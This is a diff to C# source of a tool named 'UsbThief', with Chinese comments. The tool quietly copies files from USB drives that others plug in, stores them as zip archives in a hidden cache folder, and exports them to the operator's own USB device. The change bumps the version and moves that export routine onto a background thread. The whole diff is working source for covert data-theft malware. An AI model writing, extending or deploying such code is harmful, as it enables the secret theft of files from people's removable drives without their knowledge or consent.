@@ -21,7 +21,7 @@ namespace UsbThief
     {
         #region 声明变量
         public const bool dbg = false;//调试时改为true
-        public const int innerVer = 4;
+        public const int innerVer = 5;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
         public bool fC2C = false;
         public bool inDelay = false;
@@ -331,47 +331,47 @@ namespace UsbThief
                                         else
                                         {
                                             logger.Info("目标Usb设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
-                                            try
+                                            Thread ex = new Thread(() =>
                                             {
-                                                //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
-                                                Dictionary<string, string> d = ReadSta();
-                                                Dictionary<string, bool> devices = new Dictionary<string, bool>();
-                                                if (d == null)
-                                                    return;
-                                                foreach (var item in d)
+                                                try
                                                 {
-                                                    string tmpSer = item.Key;
-                                                    string status = item.Value;
-                                                    if (status == Status.none.ToString() && !devices.ContainsKey(tmpSer))
+                                                    //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
+                                                    Dictionary<string, string> d = ReadSta();
+                                                    Dictionary<string, bool> devices = new Dictionary<string, bool>();
+                                                    if (d == null)
+                                                        return;
+                                                    foreach (var item in d)
                                                     {
-                                                        devices.Add(tmpSer, false);
-                                                    }
-                                                    else if (status == Status.exporting.ToString() && !devices.ContainsKey(tmpSer))
-                                                    {
-                                                        devices.Add(tmpSer, true);
-                                                    }
-                                                }
-                                                string path = currentDevice.name + conf.exportPath;
-                                                if (!Directory.Exists(path))
-                                                    Directory.CreateDirectory(path);
-                                                string[] files = Directory.GetFiles(workspace, "*.zip");
-                                                foreach (var file in files)
-                                                {
-                                                    foreach (var item in devices)
-                                                    {
-                                                        if (file.Substring(file.LastIndexOf("\\") + 1) == item.Key + ".zip")
+                                                        string tmpSer = item.Key;
+                                                        string status = item.Value;
+                                                        if (status == Status.none.ToString() && !devices.ContainsKey(tmpSer))
                                                         {
-                                                            string tar;
-                                                            if (path.EndsWith("\\"))
+                                                            devices.Add(tmpSer, false);
+                                                        }
+                                                        else if (status == Status.exporting.ToString() && !devices.ContainsKey(tmpSer))
+                                                        {
+                                                            devices.Add(tmpSer, true);
+                                                        }
+                                                    }
+                                                    string path = currentDevice.name + conf.exportPath;
+                                                    if (!Directory.Exists(path))
+                                                        Directory.CreateDirectory(path);
+                                                    string[] files = Directory.GetFiles(workspace, "*.zip");
+                                                    foreach (var file in files)
+                                                    {
+                                                        foreach (var item in devices)
+                                                        {
+                                                            if (file.Substring(file.LastIndexOf("\\") + 1) == item.Key + ".zip")
                                                             {
-                                                                tar = path + item.Key + ".zip";
-                                                            }
-                                                            else
-                                                            {
-                                                                tar = path + "\\" + item.Key + ".zip";
-                                                            }
-                                                            try
-                                                            {
+                                                                string tar;
+                                                                if (path.EndsWith("\\"))
+                                                                {
+                                                                    tar = path + item.Key + ".zip";
+                                                                }
+                                                                else
+                                                                {
+                                                                    tar = path + "\\" + item.Key + ".zip";
+                                                                }
                                                                 if (File.Exists(tar))
                                                                 {
                                                                     FileInfo fi1 = new FileInfo(file);
@@ -402,21 +402,19 @@ namespace UsbThief
                                                                     logger.Info("导出完成：" + tar);
                                                                 }
                                                             }
-                                                            catch (Exception e)
-                                                            {
-                                                                logger.Error("文件导出失败：\n" + e);
-                                                            }
                                                         }
                                                     }
+                                                    notifyIcon1.ShowBalloonTip(5000);
+                                                    Thread.Sleep(5000);
+                                                    notifyIcon1.Visible = false;
                                                 }
-                                                notifyIcon1.ShowBalloonTip(5000);
-                                                Thread.Sleep(5000);
-                                                notifyIcon1.Visible = false;
-                                            }
-                                            catch (Exception e)
-                                            {
-                                                logger.Error("读取状态文件失败：\n" + e);
-                                            }
+                                                catch (Exception e)
+                                                {
+                                                    logger.Error("文件导出失败：\n" + e);
+                                                }
+                                            });
+                                            ex.Start();
+                                            //ex.Join();
                                         }
                                     }
                                     break;
